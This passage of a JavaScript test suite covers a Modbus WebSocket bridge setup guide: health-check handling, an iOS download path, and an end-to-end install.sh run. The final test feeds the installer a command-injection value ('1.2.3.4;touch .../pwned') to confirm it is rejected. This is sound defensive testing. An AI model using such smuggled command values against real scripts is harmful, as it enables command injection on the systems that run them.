      reply = () => jsonRes(200, Object.assign({}, HEALTH_OK, { allow: HEALTH_OK.allow.concat('gw-1.local:5020') }));
      t = await check(); assert.includes(t, 'Writes are enabled on this page but the bridge is read-only');
      reply = () => jsonRes(403, null);
      t = await check(); assert.includes(t, '✗ The bridge at http://127.0.0.1:8600/health answered 403 Forbidden.'); assert.includes(t, 'origins');
      assert.includes(t, 'http://localhost:8080', 'names the page origin to add');
      reply = () => jsonRes(200, { status: 'ok' });
      t = await check(); assert.includes(t, 'is not the WTS Modbus bridge');
      reply = () => Promise.reject(new TypeError('Failed to fetch'));
      t = await check();
      assert.includes(t, '✗ No bridge answered at http://127.0.0.1:8600/health.'); assert.includes(t, 'Is the bridge running?'); assert.includes(t, 'local network');
      assert.strictEqual(ctl.lastCheck.results[0].reachable, false);
      reply = () => new Promise(() => {});                        // hangs → 4 s timeout
      app.click(app.find('[data-act="guide-check"]')); await app.flushAsync(10);
      assert.includes(text(app.el('mbc_guide_check')), 'Checking…');
      await app.flushAsync(4100);
      assert.includes(text(app.el('mbc_guide_check')), 'No answer from http://127.0.0.1:8600/health within 4 s.');
      app.flush(3000);
      assert.strictEqual(app.pendingTimers(), 0);
      // no bridge devices → the default bridge URL is checked
      app.win.WTS_modbus.saveConfig(app.toWin({ devices: [], tags: [] })); app.click(navBtn(app, 'modbus'));
      calls.length = 0; reply = () => jsonRes(200, HEALTH_OK);
      t = await check();
      assert.strictEqual(calls[0].url, 'http://127.0.0.1:8502/health'); assert.includes(t, 'No "Modbus TCP via WebSocket bridge" devices use this bridge yet');
      assert.strictEqual(app.errors.length, 0, app.errors.map((e) => e.message).join('; '));
    },
  },
  {
    name: 'Check bridge against a real bridge (Node fetch → /health): running, read-only, device allowed',
    wp: WP, timeoutMs: 20000,
    async run(app, assert) {
      const { createBridge } = require(path.join(TOOLS, 'modbus-bridge.js'));
      const bridge = createBridge({ port: 0, allow: ['127.0.0.1:5020'] }), port = await bridge.listen();
      try {
        const ctl = openGuide(app, { devices: [{ id: 'b', name: 'Fake slave', transport: 'ws', host: '127.0.0.1', port: 5020, url: 'ws://127.0.0.1:' + port }], tags: [] });
        app.win.fetch = (u, init) => fetch(u, { method: init.method, cache: init.cache });
        app.click(app.find('[data-act="guide-check"]'));
        await until(async () => { await app.flushAsync(0); return ctl.lastCheck; }, 5000, 'check result');
        const r = ctl.lastCheck.results[0];
        assert.ok(ctl.lastCheck.ok && r.running && r.readOnly, JSON.stringify(ctl.lastCheck));
        assert.strictEqual(r.version, BRIDGE_VERSION); assert.strictEqual(r.port, port);
        assert.includes(text(app.el('mbc_guide_check')), '✓ Fake slave — 127.0.0.1:5020 is in the allow-list');
        app.flush(3000);
        assert.strictEqual(app.pendingTimers(), 0, 'the 4 s check timeout was cleared');
      } finally { await bridge.close(); }
    },
  },
  {
    name: 'iOS app: "no bridge needed" note, no package / installer buttons, downloads go to window.iosSaveFile',
    wp: WP,
    async run(app, assert) {
      app.document.documentElement.classList.add('ios-app');
      const shares = [];
      app.win.iosSaveFile = (name, data, isB64) => { shares.push({ name, data, isB64 }); return Promise.resolve(true); };
      const ctl = openGuide(app, BRIDGE_CFG);
      assert.match(text(app.find('#mbc_guide .mb-note')), /iOS app: no bridge needed/);
      assert.ok(!app.el('mbc_guide_web').hasAttribute('open'), 'bridge section collapsed in the app');
      assert.ok(!app.find('[data-act="guide-pack"]') && !app.find('[data-act="guide-installer"]'), 'no downloads of desktop scripts in the app');
      const z = ctl.downloadPackage();
      assert.strictEqual(shares[0].name, z.filename); assert.strictEqual(shares[0].isB64, true);
      assert.strictEqual(Buffer.from(shares[0].data, 'base64').slice(0, 2).toString(), 'PK');
      assert.deepStrictEqual(readZip(Buffer.from(shares[0].data, 'base64')).map((e) => e.name.split('/')[1]), Array.from(z.files).map((f) => f.split('/')[1]));
      app.click(app.find('[data-act="exp-json"]'));
      assert.strictEqual(shares[1].name, 'modbus-config.json'); assert.strictEqual(shares[1].isB64, false);
      assert.strictEqual(JSON.parse(shares[1].data).devices.length, 5);
      assert.strictEqual(app.downloads.length, 0, 'no <a download> in the app');
    },
  },
  {
    name: 'install.sh end to end (sandbox HOME with a space): installs, writes config, bridge answers /health and reads the fake slave, stops, uninstalls',
    wp: WP, opts: false, timeoutMs: 60000,
    async run(app, assert) {
      if (process.platform === 'win32' || !hasBash) { console.log('      (install.sh end-to-end skipped: needs macOS / Linux bash)'); return; }
      let slave = createSlave({ port: 5020 }), sport;
      try { sport = await slave.listen(); } catch (e) { slave = createSlave({ port: 0 }); sport = await slave.listen(); }
      const bport = await freePort();
      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'wts bridge home '));
      const env = Object.assign({}, process.env, { HOME: home });
      delete env.XDG_DATA_HOME; delete env.XDG_CONFIG_HOME;
      const dir = path.join(home, '.local', 'share', 'wts-modbus-bridge');
      const child = spawn('bash', [path.join(TOOLS, 'install.sh'), '--allow', '127.0.0.1:' + sport, '--port', String(bport)], { env, detached: true, stdio: ['ignore', 'pipe', 'pipe'] });
      let out = '', err = '';
      child.stdout.on('data', (d) => { out += d; }); child.stderr.on('data', (d) => { err += d; });
      const exited = new Promise((resolve) => child.on('exit', (code, sig) => resolve({ code, sig })));
      try {
        const h = await until(() => getHealth(bport), 20000, 'the installed bridge /health (' + err + ')');
        assert.strictEqual(h.version, BRIDGE_VERSION); assert.strictEqual(h.readOnly, true); assert.deepStrictEqual(h.allow, ['127.0.0.1:' + sport]);
        // installed files
        for (const f of ['modbus-bridge.js', 'fake-slave.js', 'README.md']) assert.strictEqual(fs.readFileSync(path.join(dir, f), 'utf8'), fs.readFileSync(path.join(TOOLS, f), 'utf8'), f);
        assert.strictEqual(fs.readFileSync(path.join(dir, 'install.sh'), 'utf8'), fs.readFileSync(path.join(TOOLS, 'install.sh'), 'utf8'), 'installer kept for --uninstall');
        const cfg = JSON.parse(fs.readFileSync(path.join(dir, 'bridge-config.json'), 'utf8'));
        assert.deepStrictEqual({ allow: cfg.allow, port: cfg.port, listen: cfg.listen, allowWrites: cfg.allowWrites, origins: cfg.origins }, { allow: ['127.0.0.1:' + sport], port: bport, listen: '127.0.0.1', allowWrites: false, origins: [] });
        const st = fs.statSync(path.join(dir, 'start-bridge.sh'));
        assert.ok(st.mode & 0o100, 'start-bridge.sh is executable');
        assert.match(fs.readFileSync(path.join(dir, 'start-bridge.sh'), 'utf8'), /--config .*bridge-config\.json "\$@"/);
        // a real Modbus read through the installed bridge
        const M = loadCore(), tr = M.transports.webSocket({ url: 'ws://127.0.0.1:' + bport, host: '127.0.0.1', port: sport });
        await tr.open();
        const c = M.createClient(tr, { timeout: 2000, retries: 0 });
        assert.deepStrictEqual(Array.from(await c.readHoldingRegisters(1, 10, 3)).map(Number), [10, 11, 12]);
        await c.close();
        await until(() => /OK: the WTS Modbus bridge is running - v[\d.]+, read-only/.test(out), 5000, 'installer summary');
        assert.match(out, /Next steps in the Well Testing Suite/); assert.match(out, /Uninstall: +bash ".*install\.sh" --uninstall/);
        // stop (Ctrl+C / closing the window → trap stops the bridge)
        child.kill('SIGTERM');
        const ex = await exited;
        assert.strictEqual(ex.code, 0, 'installer exits cleanly: ' + JSON.stringify(ex) + ' ' + err);
        await until(async () => !(await getHealth(bport)), 5000, 'bridge stopped');
        // uninstall with the kept copy
        const u = spawnSync('bash', [path.join(dir, 'install.sh'), '--uninstall'], { env, encoding: 'utf8', timeout: 20000 });
        assert.strictEqual(u.status, 0, u.stderr); assert.match(u.stdout, /uninstalled/);
        assert.ok(!fs.existsSync(dir), 'install folder removed');
        // bad input never gets as far as a file
        const b = spawnSync('bash', [path.join(TOOLS, 'install.sh'), '--no-start', '--allow', '1.2.3.4;touch "' + home + '/pwned"'], { env, encoding: 'utf8' });
        assert.strictEqual(b.status, 1); assert.match(b.stderr, /invalid --allow entry/); assert.ok(!fs.existsSync(path.join(home, 'pwned')) && !fs.existsSync(dir));
      } finally {
        try { process.kill(-child.pid, 'SIGKILL'); } catch (e) { /* already gone */ }
        await slave.close();
        fs.rmSync(home, { recursive: true, force: true });
      }
    },
  },
];
